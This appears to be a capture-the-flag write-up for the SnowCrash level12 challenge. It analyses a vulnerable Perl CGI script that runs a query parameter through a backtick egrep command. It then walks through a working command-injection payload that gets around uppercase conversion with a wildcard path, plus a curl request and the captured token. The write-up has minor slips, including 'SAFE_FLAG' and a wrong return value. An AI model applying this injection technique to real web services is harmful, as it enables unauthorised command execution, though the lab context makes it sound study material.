@@ -1,0 +1,86 @@
+When we login as level12 we get the following files in our home directory :
+
+level12@SnowCrash:~$ ls -l
+total 4
+-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
+
+The file level12.pl is a perl script file that contains the following code :
+
+--------------------------------------------------------
+#!/usr/bin/env perl
+# localhost:4646
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+
+sub t {
+  $nn = $_[1];
+  $xx = $_[0];
+  $xx =~ tr/a-z/A-Z/; 
+  $xx =~ s/\s.*//;
+  @output = `egrep "^$xx" /tmp/xd 2>&1`;
+  foreach $line (@output) {
+      ($f, $s) = split(/:/, $line);
+      if($s =~ $nn) {
+          return 1;
+      }
+  }
+  return 0;
+}
+
+sub n {
+  if($_[0] == 1) {
+      print("..");
+  } else {
+      print(".");
+  }    
+}
+
+n(t(param("x"), param("y")));
+-------------------------------------------------------------
+
+This is a simple function that contains 2 functions
+
+- t (accepts 2 parameters)
+- n (accepts 1 parameter)
+
+The function t convert the value of first arguments value to uppercase and then it removes anything in the first line from white space to the end of the new line.
+
+and once the first argument is formated we get a shell script execution with the first argument.
+
+The code does an egrep (egrep is same as grep with option -E which uses extended regular expression) with the first parameter as the regular expression to match and /tmp/xd and redirect the standard error to the standard output. each line of the output is then compared in a loop and if the result is unexpected -1 is returned.
+
+The function n accepts only 1 argument which is compared. If the first argument is 1 then it prints .. else it prints . So we call the function n with the result of the function f as parameter.
+
+Much like the last Perl related exercise (level04) we use code related to server where we accept 2 parameters from the query string the parameters are identified as x and y. This exercise is also similar to level11 and level04 where user given parameters are used in a shell command. and much like those exercises we can exploit the shell command execution!
+
+The thing about this exercise is that it transform anything we pass to upper case, so if we ware to pass the following command $(getflag) the regex substitution would transform the string to $(GETFLAG) and as linux is case sensetive our command woun't get executed as there is no file calles GETFLAG (in uppercase).
+
+
+To solve this problem we could create a file with UPPER case name so that even if our string is transformed to upper case it woun't metter because our file gas upper case letter name. So let's say we create a siple file in the   /tmp directory :
+
+(The file is called SAVE_FLAG)
+
+--------------------------------------
+#!/bin/sh
+
+getflag > /tmp/flag12
+--------------------------------------
+
+Once we create the file SAVE_FLAG we make it executable so that we can call the executable file directly :
+
+level12@SnowCrash:~$ chmod +x /tmp/SAVE_FLAG
+
+Now we can execute our executable script line $(/tmp/SAVE_FLAG) and it save the flag in a file called /tmp/flag12. But the problem is that we still can't use this command as the /tmp will be transform to /TMP and the command will look like $(/TMP/SAVE_FLAG) and there are no directory named TMP 
+
+To solve this problem we can simply use the wildcard * character so it executes every file named SAVE_FLAG in all directory. So our new command will look like $(/*/SAFE_FLAG). So now we can get our flag using the following command.
+
+
+
+level12@SnowCrash:~$ curl 'localhost:4646/?x=$(/*/SAVE_FLAG)'; cat /tmp/flag12
+..Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+
+
+
+And naturally it reveal us the flag.
+
+So the Password to connect to the account level12 is g1qKMiRpXf53AWhDaU7FEkczr
